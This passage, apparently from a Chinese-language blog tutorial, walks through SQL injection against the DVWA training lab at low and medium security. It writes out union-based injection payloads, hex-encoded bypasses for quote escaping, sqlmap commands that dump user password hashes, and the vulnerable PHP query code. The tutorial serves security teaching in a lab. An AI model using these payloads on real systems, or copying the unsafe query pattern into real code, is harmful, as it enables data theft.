+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; or 1=1#
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735691.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735691.png" 
+             alt="image-20240411213036653" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p><strong>四、判断列数</strong></p>
+<p>使用 <code>order by</code> 语句判断目标数据库表中的列数，依次提交 <code>1' order by 1#</code> 语句，数字从大到小，当出现报错信息后确定列数。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; order by 1#
+</span></span></span><span class="line"><span class="cl"><span class="s1">1&#39;</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">2</span><span class="o">#</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; order by 3# 
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735692.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735692.png" 
+             alt="image-20240411214439810" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735693.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735693.png" 
+             alt="image-20240411214409610" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735694.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735694.png" 
+             alt="image-20240411214320827" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>当提交 <code>1' order by 3#</code> 时出现报错信息，说明目标数据库表中的列数为2</p>
+<p><strong>五、提取库名、表名、字段名、值</strong></p>
+<p>1、提取库名</p>
+<p>依据前一步得到的列数构建注入语句，得到数据库名dvwa</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select 1,database()#
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735695.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735695.png" 
+             alt="image-20240411214816515" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>2、提取表名</p>
+<p>通过注入攻击来获取名为’dvwa’的数据库中的所有表名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;</span><span class="n">dvwa</span><span class="s1">&#39;#
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">//information_schema 是一个特殊的系统数据库，其中包含了所有用户创建的数据库以及这些数据库中的表的信息。tables 表提供了关于所有表的详细信息，如表名、表类型等。
+</span></span></span><span class="line"><span class="cl"><span class="s1">//&#34;1,table_name&#34;中的&#39;</span><span class="mi">1</span><span class="s1">&#39;是一个占位符，用于模拟与原始查询返回相同数量的列，以便UNION操作成功执行。
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>当提交注入语句时，可能出现如下错误信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Illegal mix of collations for operation &#39;UNION&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735696.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735696.png" 
+             alt="image-20240411220050884" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>这是由于MySQL在执行 <code>UNION</code> 操作时遇到的不同字符集之间的冲突报错。</p>
+<p>解决方法：打开CMD，登录MySQL的dvwa数据库，修改first_name和last_name字段的字符集</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">modify</span><span class="w"> </span><span class="n">first_name</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span><span class="w"> </span><span class="k">character</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="n">utf8</span><span class="w"> </span><span class="k">collate</span><span class="w"> </span><span class="n">utf8_general_ci</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">modify</span><span class="w"> </span><span class="n">last_name</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span><span class="w"> </span><span class="k">character</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="n">utf8</span><span class="w"> </span><span class="k">collate</span><span class="w"> </span><span class="n">utf8_general_ci</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">将</span><span class="n">first_name和last_name字段的字符集都设置为了utf8</span><span class="err">，并指定了排序规则为</span><span class="n">utf8_general_ci</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改完毕后，命令执行成功</p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735697.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735697.png" 
+             alt="image-20240411221106229" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>3、提取字段名</p>
+<p>通过注入攻击获取数据库中特定表（本例中为 <code>users</code> 表）的所有字段名。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select 1,column_name from information_schema.columns where table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;#
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735698.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735698.png" 
+             alt="image-20240412083706100" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>4、提取值</p>
+<p>从数据库表 <code>users</code> 中提取 <code>user</code> 和 <code>password</code> 字段的数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select user,password from users#
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行命令出现同样的字符编码问题，解决方法还是修改字段的字符集</p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735699.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735699.png" 
+             alt="image-20240412083801374" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">modify</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span><span class="w"> </span><span class="k">character</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="n">utf8</span><span class="w"> </span><span class="k">collate</span><span class="w"> </span><span class="n">utf8_general_ci</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">modify</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="w"> </span><span class="k">character</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="n">utf8</span><span class="w"> </span><span class="k">collate</span><span class="w"> </span><span class="n">utf8_general_ci</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行成功得到用户和密码的数据，密码为32位小写MD5，可以通过 <a href="https://www.cmd5.com/default.aspx"target="_blank" rel="noopener noreferrer">在线工具</a> 解密</p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735700.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735700.png" 
+             alt="image-20240412084253957" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735701.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735701.png" 
+             alt="image-20240412111534464" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p><strong>六、SQLmap工具使用</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735702.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735702.png" 
+             alt="image-20240412103446366" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735703.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735703.png" 
+             alt="image-20240412103645411" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735704.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735704.png" 
+             alt="image-20240412104023272" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>1、提取库名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low&#34; --dbs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735705.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735705.png" 
+             alt="image-20240412104144581" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>2、提取表名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low&#34; -D dvwa --tables
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735706.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735706.png" 
+             alt="image-20240412104236250" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>3、提取字段名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low&#34; -D dvwa -T users --columns
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735707.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735707.png" 
+             alt="image-20240412104324776" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>4、提取值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=i0ssj777jur6gqb9af6bd111tn; security=low&#34; --batch -D dvwa -T users -C user,password --dump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735708.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735708.png" 
+             alt="image-20240603085905398" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p><strong>七、分析后台脚本</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) {
+</span></span><span class="line"><span class="cl">	// Get input
+</span></span><span class="line"><span class="cl">	$id = $_REQUEST[ &#39;id&#39; ];
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Check database
+</span></span><span class="line"><span class="cl">	$query  = &#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&#34;;
+</span></span><span class="line"><span class="cl">	$result = mysqli_query($GLOBALS[&#34;___mysqli_ston&#34;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&#34;___mysqli_ston&#34;])) ? mysqli_error($GLOBALS[&#34;___mysqli_ston&#34;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Get results
+</span></span><span class="line"><span class="cl">	while( $row = mysqli_fetch_assoc( $result ) ) {
+</span></span><span class="line"><span class="cl">		// Get values
+</span></span><span class="line"><span class="cl">		$first = $row[&#34;first_name&#34;];
+</span></span><span class="line"><span class="cl">		$last  = $row[&#34;last_name&#34;];
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		// Feedback for end user
+</span></span><span class="line"><span class="cl">		$html .= &#34;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&#34;;
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	mysqli_close($GLOBALS[&#34;___mysqli_ston&#34;]);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 检查是否有&#34;Submit&#34;按钮被点击
+</span></span><span class="line"><span class="cl">if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) {
+</span></span><span class="line"><span class="cl">        // 获取用户输入的ID
+</span></span><span class="line"><span class="cl">        $id = $_REQUEST[ &#39;id&#39; ];
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        // 构建SQL查询语句
+</span></span><span class="line"><span class="cl">        $query  = &#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&#34;;
+</span></span><span class="line"><span class="cl">        // 执行SQL查询
+</span></span><span class="line"><span class="cl">        $result = mysqli_query($GLOBALS[&#34;___mysqli_ston&#34;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&#34;___mysqli_ston&#34;])) ? mysqli_error($GLOBALS[&#34;___mysqli_ston&#34;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        // 处理查询结果
+</span></span><span class="line"><span class="cl">        while( $row = mysqli_fetch_assoc( $result ) ) {
+</span></span><span class="line"><span class="cl">                // 获取查询结果中的名字和姓氏
+</span></span><span class="line"><span class="cl">                $first = $row[&#34;first_name&#34;];
+</span></span><span class="line"><span class="cl">                $last  = $row[&#34;last_name&#34;];
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">                // 拼接输出结果
+</span></span><span class="line"><span class="cl">                $html .= &#34;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&#34;;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        // 关闭数据库连接
+</span></span><span class="line"><span class="cl">        mysqli_close($GLOBALS[&#34;___mysqli_ston&#34;]);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="medium">Medium</h3>
+<p>1、修改电脑代理服务器IP设置为127.0.0.1，端口设置为8888，Bur调整代理参数与电脑代理一致</p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735710.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735710.png" 
+             alt="image-20240412094734133" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735711.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735711.png" 
+             alt="image-20240412095237028" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735712.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735712.png" 
+             alt="image-20240412094536046" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>2、在DVWA中尝试提交一个ID，在BurpSuite的repeater中查看捕获到的提交信息。使用BurpSuite的repeater模块可以重复发送数据，查看返回数据。</p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735713.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735713.png" 
+             alt="image-20240412095327893" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735714.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735714.png" 
+             alt="image-20240412095418437" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735715.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735715.png" 
+             alt="image-20240412095516476" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735716.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735716.png" 
+             alt="image-20240412095727503" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>3、确认列数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 order by 1#
+</span></span><span class="line"><span class="cl">4 order by 2#
+</span></span><span class="line"><span class="cl">4 order by 3#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735717.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735717.png" 
+             alt="image-20240412095859327" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735718.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735718.png" 
+             alt="image-20240412095934153" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>4、库、表、字段、值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 union select 1,database()#
+</span></span><span class="line"><span class="cl">//得到库名
+</span></span><span class="line"><span class="cl">4 union select 1,table_name from information_schema.tables where table_schema=0x64767761#
+</span></span><span class="line"><span class="cl">//得到表名
+</span></span><span class="line"><span class="cl">4 union select 1,column_name from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273#
+</span></span><span class="line"><span class="cl">//得到字段
+</span></span><span class="line"><span class="cl">4 union select user,password from users#
+</span></span><span class="line"><span class="cl">//得到值
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>提取库名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 union select 1,database()#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735719.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735719.png" 
+             alt="image-20240412101400469" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>提取表名</p>
+<p>注入语句发现单引号被转义，使用BurpSuite的Decoder模块，将 <code>'dvwa'</code> 转为16进制，自行添加 <code>0x</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39;#
+</span></span><span class="line"><span class="cl">4 union select 1,table_name from information_schema.tables where table_schema=0x64767761#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735720.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735720.png" 
+             alt="image-20240412101948084" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735721.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735721.png" 
+             alt="image-20240412102504354" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735722.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735722.png" 
+             alt="image-20240412102654211" 
+              
